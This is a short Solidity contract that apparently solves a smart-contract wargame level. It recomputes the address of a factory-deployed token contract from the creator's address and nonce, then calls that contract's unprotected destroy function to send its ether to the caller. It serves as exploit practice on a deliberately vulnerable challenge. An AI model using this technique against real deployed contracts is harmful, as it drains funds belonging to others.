// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

import "./SimpleToken.sol";

contract RecoveryAttack {
    function attack(address payable _target) public {
        SimpleToken target = SimpleToken(_target);
        target.destroy(payable(msg.sender));
    }

    function getTargetAddress(address _instanceAddress)
        public
        pure
        returns (address)
    {
        return
            address(
                uint160(
                    uint256(
                        keccak256(
                            abi.encodePacked(
                                bytes1(0xd6),
                                bytes1(0x94),
                                _instanceAddress,
                                bytes1(0x01)
                            )
                        )
                    )
                )
            );
    }
}
